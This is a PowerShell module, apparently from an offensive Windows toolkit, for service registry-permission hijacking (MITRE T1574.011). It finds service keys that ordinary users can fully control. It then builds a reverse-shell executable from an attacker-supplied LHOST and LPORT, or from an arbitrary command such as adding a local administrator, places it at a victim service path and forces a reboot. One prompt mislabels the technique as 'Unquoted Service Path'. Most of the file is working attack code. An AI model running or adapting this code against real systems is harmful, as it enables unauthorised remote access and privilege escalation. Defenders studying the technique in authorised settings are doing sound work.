

function WFL-check-T1574.011 {
	write-host
	
	$regkeys = Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\* | % { $_.path }
	foreach ($regkey in $regkeys) {
		write-host "Checking Service:" $regkey -ForegroundColor RED
		
		$vuln = Get-Acl -Path $regkey | ForEach-Object { $_.access } | Where-Object { ($_.RegistryRights -eq "FullControl") -and ($_.IdentityReference -eq "BUILTIN\Users") }
		
		if ( $null -eq $vuln ) {
    
		}
		else {
			Write-Host $regkey -ForegroundColor Green
			Write-Host  "COULD BE VULNERABLE!" -ForegroundColor Green
			Get-Acl -Path $regkey | ForEach-Object { $_.access } | Where-Object { ($_.RegistryRights -eq "FullControl") -and ($_.IdentityReference -eq "BUILTIN\Users") }
		}
	}

          
             
} function WFL-info-T1574.011 {
            
	Write-Host  
	Write-host "	Adversaries may execute their own malicious payloads
	by hijacking the Registry entries used by services. 
	Adversaries may use flaws in the permissions for Registry keys 
	related to services to redirect from the originally specified executable 
	to one that they control, in order to launch their own code when a service starts. 
	Windows stores local service configuration information in the Registry under
	HKLM\SYSTEM\CurrentControlSet\Services."       
	Write-Host 
        

} function WFL-exploit-T1574.011 {
	write-host

	$exploit_service = Read-Host -Prompt '[*] Insert the path you want to exploit with Unquoted Service Path, including the filename of the executable: Ex. C:\Program Files\1 Subfolder\2.exe '
	write-host
	

	do {
		$confirm = ""
		$confirm = Read-Host -Prompt '[*] Type "agent" if you want to create a new reverse shell or "cmd" if you want to execute a command'
		$array = "agent", "cmd"
		if ($confirm -eq 'agent') {
			Write-Host
			$ipaddress_rev = Read-Host -Prompt '[*] Insert LHOST: '
			$port_rev = Read-Host -Prompt '[*] Insert LPORT: '
			 
			$original_file = '.\lib\rev.ps1'
			$destination_file = '.\lib\revshell.ps1'
					(Get-Content $original_file) | Foreach-Object {
				$_ -replace 'ipaddress_rev', $ipaddress_rev `
					-replace 'port_rev', $port_rev `
			} | Set-Content $destination_file
			  
			Invoke-Exec .\lib\revshell.ps1 .\lib\revshell.exe -noConsole -noError
			Remove-Item .\lib\revshell.ps1
			write-host
		}
		elseif ($confirm -eq 'cmd') {
			Write-Host
			$cmd = Read-Host -Prompt '[*] Insert a command that you want to execute in the victim machine (Ex.net user /add [username] [password] && net localgroup administrators [username] /add): '
					
			 
			$original_file = '.\lib\cmd_master.ps1'
			$destination_file = '.\lib\cmd.ps1'
					(Get-Content $original_file) | Foreach-Object {
				$_ -replace 'command', $cmd `
			} | Set-Content $destination_file
			  
			Invoke-Exec .\lib\cmd.ps1 .\lib\revshell.exe -noConsole -noError
			write-host
		}
	}  until ($confirm -in $array)


	try {
		Copy-Item .\lib\revshell.exe $exploit_service
		Remove-Item .\lib\revshell.exe
		write-host 
	}

	catch { 
		Write-Host "[-] Unable to copy the executable. Please try again." -ForegroundColor red
		Write-Host $_
		Write-Host
		break
	}

	$confirmation = ""
	do {
		$confirmation = Read-Host "[*] To enable the agent or cmd you must restart victim pc, are you sure you want to restart the pc? (y/n)"
		if ($confirmation -eq 'y') {
			shutdown /r /t 0
		}
	} while ($confirmation -ne "n")
}
             




             

             
             

